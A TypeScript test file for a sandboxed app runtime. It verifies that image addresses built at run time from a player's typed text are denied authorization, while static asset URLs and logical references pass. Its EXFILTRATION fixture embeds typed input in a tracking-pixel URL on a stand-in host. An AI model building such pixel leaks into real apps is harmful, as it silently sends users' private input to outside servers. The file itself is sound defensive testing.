import {
	authorizeRuntimeAssetTarget,
	classifyRuntimeAssetValue,
} from "@rowcat/runtime/asset";
import { describe, expect, it } from "vitest";
import {
	assetPathOf,
	type RuntimeHostValue,
	type RuntimePatchBatch,
} from "./patches.ts";
import { createRuntimeVmSession } from "./session.ts";
import { compiled, testEngine } from "./test/fixtures.ts";
import { TestHostTree } from "./testing/host-tree.ts";

/**
 * A remote address built from a runtime value must not become an outgoing request. That is the one
 * thing this file guards.
 *
 * The test does not use a hand-written patch. It walks the real chain: creator TSX, then the
 * compiler, the artifact, QuickJS, the reconciler, and finally the patch batch. At the end it
 * extracts the `$asset` value and compares it with the session's authorization list. Checking an
 * assembled patch would confirm the values we wrote, not whether the rule actually runs, and such a
 * test would still pass on the day the compiler stopped building the list.
 *
 * The failure is silent. If authorization is forgotten, the picture still renders normally. Only
 * the value the creator's server receives changes, and that is why this file exists.
 */

const IMPORTS = `import { Image, Stack, TextInput, asset, useState } from "@rowcat/runtime";`;

/**
 * An app that sends the player's typed text straight into a remote address. This is exactly the
 * attack.
 *
 * It also draws a fixed picture, so the check is not "passes because the list is empty." It
 * verifies that static resources open and assembled ones are blocked.
 */
const EXFILTRATION = `
export default function App() {
	const [secret, setSecret] = useState("");
	return (
		<Stack>
			<TextInput value={secret} onChangeText={setSecret} />
			<Image source={asset("https://cdn.example.com/logo.png")} alt="logo" />
			<Image source={asset(\`https://creator.example/pixel.png?q=\${secret}\`)} alt="p" />
		</Stack>
	);
}`;

interface Mounted {
	session: Awaited<ReturnType<typeof createRuntimeVmSession>>;
	tree: TestHostTree;
	type(text: string): Promise<void>;
	/** Every `Image` source in the tree: the asset strings the VM actually emitted. */
	sources(): string[];
	dispose(): Promise<void>;
}

async function mount(source: string): Promise<Mounted> {
	const session = await createRuntimeVmSession({
		engine: testEngine(),
		artifact: compiled([
			{ path: "src/main.tsx", content: `${IMPORTS}\n${source}` },
		]),
	});
	const tree = new TestHostTree();
	const commits: RuntimePatchBatch[] = [];
	const mounted = await session.mountRoot({
		onCommit: (batch) => {
			commits.push(batch);
			tree.apply(batch);
		},
	});
	if (!mounted.ok) throw mounted.error;

	const sources = (): string[] => {
		const found: string[] = [];
		const walk = (nodes: readonly unknown[]): void => {
			for (const node of nodes) {
				if (typeof node !== "object" || node === null) continue;
				const record = node as {
					props?: Record<string, RuntimeHostValue>;
					children?: readonly unknown[];
				};
				const path = assetPathOf(record.props?.source ?? null);
				if (path !== null) found.push(path);
				if (record.children) walk(record.children);
			}
		};
		walk(tree.children());
		return found;
	};

	const type = async (text: string): Promise<void> => {
		const input = tree.find((node) => node.kind === "text-input");
		if (input === null) throw new Error("no text input");
		const handler = input.props.onChangeText;
		const id =
			typeof handler === "object" &&
			handler !== null &&
			"$handler" in handler &&
			typeof (handler as { $handler: unknown }).$handler === "number"
				? (handler as { $handler: number }).$handler
				: null;
		if (id === null) throw new Error("input has no onChangeText");
		const outcome = await session.dispatchEvent(id, text);
		if (!outcome.ok) throw outcome.error;
		await session.settle();
	};

	return { session, tree, type, sources, dispose: () => session.dispose() };
}

/**
 * Whether a string is authorized in this session. This is the same judgment the renderer and the
 * app apply.
 */
const authorized = (m: Mounted, value: string): boolean => {
	const target = classifyRuntimeAssetValue(value);
	return (
		target !== null &&
		authorizeRuntimeAssetTarget(target, m.session.remoteAssets) !== null
	);
};

describe("remote addresses assembled at run time are not authorized", () => {
	it("an address carrying text the player typed is off the list; static addresses still open", async () => {
		const m = await mount(EXFILTRATION);
		try {
			/** The artifact declares only the static addresses written in its source. */
			expect([...m.session.remoteAssets]).toEqual([
				"https://cdn.example.com/logo.png",
			]);

			await m.type("secret-value");

			const emitted = m.sources();
			/** The VM does emit the assembled address. The blocking point is not the reconciler. */
			expect(emitted).toContain(
				"https://creator.example/pixel.png?q=secret-value",
			);
			expect(emitted).toContain("https://cdn.example.com/logo.png");

			expect(authorized(m, "https://cdn.example.com/logo.png")).toBe(true);
			expect(
				authorized(m, "https://creator.example/pixel.png?q=secret-value"),
			).toBe(false);
			/** If the typed text changes, the address changes too. Neither one is in the list. */
			await m.type("another");
			expect(authorized(m, "https://creator.example/pixel.png?q=another")).toBe(
				false,
			);
		} finally {
			await m.dispose();
		}
	});

	/**
	 * Logical references are not an axis of authorization. They pass through regardless of the list,
	 * even when it is empty, because no request is made.
	 */
	it("logical references pass regardless of the list", async () => {
		const m = await mount(`
export default function App() {
	return <Stack><Image source={asset("characters/sena/smile")} alt="s" /></Stack>;
}`);
		try {
			expect([...m.session.remoteAssets]).toEqual([]);
			expect(authorized(m, "characters/sena/smile")).toBe(true);
		} finally {
			await m.dispose();
		}
	});
});

describe("the list belongs to the session", () => {
	it("two sessions do not authorize each other's addresses", async () => {
		const a = await mount(`
export default function App() {
	return <Stack><Image source={asset("https://a.example.com/one.png")} alt="a" /></Stack>;
}`);
		const b = await mount(`
export default function App() {
	return <Stack><Image source={asset("https://b.example.com/two.png")} alt="b" /></Stack>;
}`);
		try {
			expect(authorized(a, "https://a.example.com/one.png")).toBe(true);
			expect(authorized(a, "https://b.example.com/two.png")).toBe(false);
			expect(authorized(b, "https://b.example.com/two.png")).toBe(true);
			expect(authorized(b, "https://a.example.com/one.png")).toBe(false);
		} finally {
			await a.dispose();
			await b.dispose();
		}
	});
});
